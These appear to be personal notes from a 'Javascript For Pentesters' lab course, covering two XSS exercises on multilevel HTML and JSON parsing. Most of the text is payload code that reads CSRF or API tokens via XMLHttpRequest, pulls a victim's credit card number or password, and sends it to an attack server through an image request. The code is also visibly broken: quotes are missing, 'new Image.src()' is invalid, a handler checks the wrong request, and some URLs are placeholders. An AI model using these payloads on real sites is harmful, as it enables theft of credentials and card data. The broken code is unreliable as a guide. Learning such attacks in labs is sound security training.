                    Javascript For Pentesters
                    Course Notes Part 5


19 - Multilevel HTML Parsing
Similar to the previous exercise
The task is to use an XHR vulnerability to get a user's credit card number, display it in a div and send to attack server
User Settings link has CSRF token
One the user settings page source code there is a hidden forms with random CSRF value
HTML will have to be parsed twice to solve the challenge
Solution Syntax
  <script>
    var link = document.getElementById(settingd");
    
    // The XHR request
    var req = new XMLHttpRequest();
    
    var csrf_token = '';
    var uid = '';
    
    var req2 = new XMLHttpRequest();
    
    // A handler for when the server responds
    req2.onreadystatechange = function(){
      if(req.readyState == 4 && req.status == 200){
        var htmlPage = req2.responseXML;
        var credit_card = htmlPage.getElementById("result").innerHTML;
        document.getElementById("result").innerHTML = credit_card;
        new Image.src() = "http://localhost:8800/?credit_card_number=" + credit_card;
      }
    };
    
    req.onreadystatechange = function(){
      if(req.readyState == 4 && req.status == 200){
        var htmlPage = req.responseXML;
        csrf_token = htmlPage.forms[0].elements[1].value;
        alert(csrf_token);
        
        req2.open("GET", "lab url ?uid="+uid+"&csrf_token="+csrf_token, true);
        req2.responseType = "document";
        req2.send();
      }
    };
    
    uid = link.innerHTML.split(':')[1];
    req.open("GET", link.href, true);
    req.responseType = "document";
    req.send();
  </script>


20 - Multilevel JSON parsing
Data is exchanged in web apps a lot using the JSON format, this is especially true using API on different portal
Like in previous challenges the user pass will have to be displayed in a div called result, also like before the
page contains an XSS vulnerability
Examining the source code of the page gives a hint that there is 2 JSON API being used, getting the password and using the 
token returned by the first API as the input for the second
A lot of this solution comes from the previous solution
Solution Syntax
  <script>
    var link = document.getElementById(settingd");
    
    // The XHR request
    var req = new XMLHttpRequest();
    var req2 = new XMLHttpRequest();

    var csrf_token = '';
    var uid = '';
    
    // A handler for when the server responds
    req2.onreadystatechange = function(){
      if(req.readyState == 4 && req.status == 200){
        var pass_obj = JSON.parse(req2.responseText);
        var password = pass_obj.resp.password;
        document.getElementById("result").innerHTML = password;
        new Image.src() = "http://localhost:8800/?password="+password+"&uid="+uid;
      }
    }
    
    req.onreadystatechange = function(){
      if(req.readyState == 4 && req.status == 200){
        response_obj = JSON.parse(req.responseText);;
        token = response_obj.params.token;
        
        req2.open("GET", "lab url /getpassword?token="+token, true);
        req2.responseType = "document";
        req2.send();
      }
    };
    
    uid = link.innerHTML.split(':')[1];
    req.open("GET", "lab url/gettoken?uid="+uid, true);
    req.send();
    
  </script>

